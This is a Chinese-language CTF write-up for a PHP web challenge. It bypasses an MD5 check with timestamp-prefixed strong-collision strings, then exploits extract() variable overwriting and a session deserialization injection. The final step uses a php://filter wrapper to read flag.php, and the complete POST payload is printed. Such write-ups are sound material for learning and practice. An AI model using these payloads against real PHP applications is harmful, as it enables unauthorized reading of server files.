## 老狼老狼几点了

首先进入页面有一个输入框

![image-20230521101153073](C:\Users\cby20\AppData\Roaming\Typora\typora-user-images\image-20230521101153073.png)

但没发现什么利用方法

直接扫目录文件

发现有个guess_time.php

![image-20230521101244542](C:\Users\cby20\AppData\Roaming\Typora\typora-user-images\image-20230521101244542.png)

分析一下

传递了两个POST参数经过两个if判断

第一个if

让我们判断MD5

经典强碰撞

```
param1=%28%CF%8A%A3%C9D%DEXW%21E%8E%84.%EA%82.%9D-%27%8C%C7%21%3E%29BC%C120%16%D0a%E6%B9%E4Z%14%3A%21kn%C3%A1%E15%99c%BA%CCC%5B%86%CD%5B%12%5E6%A2%94%EB%A8%8D%8F2%9C%08%18d%EAF%DC%04%B2Y%1E%1E%A3%F3%F5%9E%94%16%C6%065%7B%0C%1A%09%EF5%CA%0B%81%FE%AD%0F%B3%95%AA%CFv%07%861%C5q%8F%7C%D9%5D%CDT%0D%D3X%D8%23%90%A2%9BOu%ACc%9DK
param2=%28%CF%8A%A3%C9D%DEXW%21E%8E%84.%EA%82.%9D-%A7%8C%C7%21%3E%29BC%C120%16%D0a%E6%B9%E4Z%14%3A%21kn%C3%A1%E1%B5%99c%BA%CCC%5B%86%CD%5B%12%5E6%A2%14%EB%A8%8D%8F2%9C%08%18d%EAF%DC%04%B2Y%1E%1E%A3%F3%F5%9E%94%16F%065%7B%0C%1A%09%EF5%CA%0B%81%FE%AD%0F%B3%95%AA%CFv%07%861%C5q%8F%FC%D8%5D%CDT%0D%D3X%D8%23%90%A2%9BO%F5%ACc%9DK
```

第二个if需要让p1的前10位等于当前unix的时间戳

![image-20230521102640498](C:\Users\cby20\AppData\Roaming\Typora\typora-user-images\image-20230521102640498.png)

那我们的思路就是当前时间戳+%00+md5强碰撞

```
<?php

$param1='ddd%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C3%60%DA%F5%17%CEwA%C9%05%C6%0C%CDD%10%0FS%AA%EA%E4%CE%B3%FBd.f%3A%B9%CA%9D%3B%9B%E3%1D%F7%CBN%25%18%84%8F%E4%F0%3C%D0%B5%A6EC%0D%81%3FJ%BA%7D%DC%FA%A3%91H%C7Bs%B8-I%07%F5%98%D2E%8B%93%DBU%B2%81%7F%E4fN%9Ax%EA%FB%BC%A0%21%E1%BB%F2%C8%DCp%7D%9E%BF%3A%96%BE%1Dp%87%13%C3%AB%9D%EF%8A1h%08%00%DC%B3%1F%29%91%0Ai%1C%E1%F0N7%0D%A1%B7';
$param2='ddd%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C3%60%DA%F5%17%CEwA%C9%05%C6%0C%CDD%10%0FS%AA%EAd%CE%B3%FBd.f%3A%B9%CA%9D%3B%9B%E3%1D%F7%CBN%25%18%84%8F%E4%F0%3C%D05%A7EC%0D%81%3FJ%BA%7D%DC%FA%A3%91%C8%C7Bs%B8-I%07%F5%98%D2E%8B%93%DBU%B2%81%7F%E4fN%9Axj%FB%BC%A0%21%E1%BB%F2%C8%DCp%7D%9E%BF%3A%96%BE%1Dp%87%13%C3%AB%9D%EF%8A%B1g%08%00%DC%B3%1F%29%91%0Ai%1C%E1%F0%CE7%0D%A1%B7';
echo urldecode($param1)."\n";
echo urldecode($param2)."\n";
if(md5(urldecode($param1))===md5(urldecode($param2))&&$param1!==$param2)
{
    echo "yes"."\n";
}
else
{
    echo "no"."\n";
}
```

![image-20230521102956878](C:\Users\cby20\AppData\Roaming\Typora\typora-user-images\image-20230521102956878.png)

至于需要多少长度的%00这个是根据当前时间来确定的这里不再过多叙述

后面就是反序列化的内容

直接__destruct方法进入然后调call_func方法

最后目的进入call_func方法让function==hack进入else if中然后

使用php伪协议来读取文件

这里我们可以利用extract的变量覆盖漏洞

最后payload如下



```
param1=1684637400%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F2%BC%C0%96C6b%3C%F8r%91%94K%BB%5E%1C%B2%7E%8Cr%FC%A3x%153F%3B%F9%AA%7D%22%DFo%0B%0E%D0%F2%D2%D0%1D%8B%22n%7B7%FAgS%B7%B3%8C%F7%82%13N%60%90%D7a%D3%1D%EFG%99%D0L%CBP%85%B3%EAY%0D%D5v%B5%D4F%18%F8%D9%3F%F2o%60%5BC%F9%C9%B30x%16%60%88%C7%CB%5D%02h%97%C7%02%7C9%02%86%9B%88%E8%ED%C9%A4%EA%03QO%D4%BAn%0Ft%3C%AA%B7%C6%CC%9B
&param2=1684637400%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%F2%BC%C0%96C6b%3C%F8r%91%94K%BB%5E%1C%B2%7E%8C%F2%FC%A3x%153F%3B%F9%AA%7D%22%DFo%0B%0E%D0%F2%D2%D0%1D%8B%22n%7B7zhS%B7%B3%8C%F7%82%13N%60%90%D7aS%1D%EFG%99%D0L%CBP%85%B3%EAY%0D%D5v%B5%D4F%18%F8%D9%3F%F2%EF%60%5BC%F9%C9%B30x%16%60%88%C7%CB%5D%02h%97%C7%02%7C9%02%86%9B%88h%ED%C9%A4%EA%03QO%D4%BAn%0Ft%3C%2A%B7%C6%CC%9B
&_SESSION[a]=base64base64base64
&_SESSION[bbb]=;s:4:"file";s:62:"php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php";s:8:"function";s:4:"hack";s:9:"function1";s:4:"hack";}
```

成功读取到flag

![image-20230521105312437](C:\Users\cby20\AppData\Roaming\Typora\typora-user-images\image-20230521105312437.png)